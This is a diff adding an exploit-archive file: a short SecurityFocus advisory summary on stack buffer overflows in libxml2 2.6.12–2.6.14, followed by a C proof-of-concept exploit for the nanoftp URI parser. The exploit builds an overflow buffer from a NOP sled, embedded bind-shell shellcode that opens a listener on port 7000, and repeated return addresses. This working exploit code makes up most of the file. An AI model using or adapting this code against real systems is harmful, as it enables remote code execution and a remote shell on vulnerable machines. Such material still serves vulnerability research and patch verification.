@@ -1,0 +1,87 @@
+source: http://www.securityfocus.com/bid/11526/info
+
+The 'libxml2' library is reported prone to multiple remote stack-based buffer-overflow vulnerabilities caused by insufficient boundary checks. Remote attackers may exploit these issues to execute arbitrary code on a vulnerable computer. 
+
+The URI parsing functionality and the DNS name resolving code are affected. 
+
+These issues affect libxml2 2.6.12 through 2.6.14. Other versions may also be affected.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+/*
+ *  libxml 2.6.12 nanoftp bof POC   infamous42mdAThotpopDOTcom
+ *
+ *  [n00b@localho.outernet] gcc -Wall libsuxml.c -lxml2
+ *  [n00b@localho.outernet] ./a.out
+ *  Usage: ./a.out <retaddr> [ align ]
+ *  [n00b@localho.outernet] netstat -ant | grep 7000
+ *  [n00b@localho.outernet] ./a.out 0xbfff0360
+ *  xmlNanoFTPScanURL: Use [IPv6]/IPv4 format
+ *  [n00b@localho.outernet] netstat -ant | grep 7000
+ *  tcp        0      0 0.0.0.0:7000            0.0.0.0:*               LISTEN
+ *
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <libxml/nanoftp.h>
+
+#define die(x) do{ perror((x)); exit(1); }while(0)
+#define BS 0x10000
+#define NOP 0x90
+#define NNOPS 3000
+#define ALIGN 0
+
+/* call them */
+#define SHELL_LEN (sizeof(sc)-1)
+char sc[] =
+    "\x31\xc0\x50\x50\x66\xc7\x44\x24\x02\x1b\x58\xc6\x04\x24\x02\x89\xe6"
+    "\xb0\x02\xcd\x80\x85\xc0\x74\x08\x31\xc0\x31\xdb\xb0\x01\xcd\x80\x50"
+    "\x6a\x01\x6a\x02\x89\xe1\x31\xdb\xb0\x66\xb3\x01\xcd\x80\x89\xc5\x6a"
+    "\x10\x56\x50\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x6a\x01\x55\x89\xe1\x31"
+    "\xc0\x31\xdb\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x50\x50\x55\x89\xe1\xb0"
+    "\x66\xb3\x05\xcd\x80\x89\xc5\x31\xc0\x89\xeb\x31\xc9\xb0\x3f\xcd\x80"
+    "\x41\x80\xf9\x03\x7c\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+    "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+
+/*
+ */
+int main(int argc, char **argv)
+{
+    int x = 0, len = 0;
+    char    buf[BS] = {'A',};
+    long    retaddr = 0, align = ALIGN;
+
+    if(argc < 2){
+        fprintf(stderr, "Usage: %s <retaddr> [ align ]\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+    if(sscanf(argv[1], "%lx", &retaddr) != 1)
+        die("sscanf");
+    if(argc > 2)
+        align = atoi(argv[2]);
+    if(align < 0 || align > 3)
+        die("nice try newblar");
+
+    strncpy(buf, "://[", 4);
+    len += 4;
+    memset(buf+len, NOP, NNOPS);
+    len += NNOPS;
+    memcpy(buf+len, sc, SHELL_LEN);
+    len += SHELL_LEN;
+
+    len += align;
+    for(x = 0; x < 2000 - (sizeof(retaddr) - 1); x += sizeof(retaddr))
+        memcpy(buf+len+x, &retaddr, sizeof(retaddr));
+    buf[len+x] = ']';
+    buf[len+x+1] = 0;
+
+    xmlNanoFTPNewCtxt(buf);
+
+    return EXIT_SUCCESS;
+}
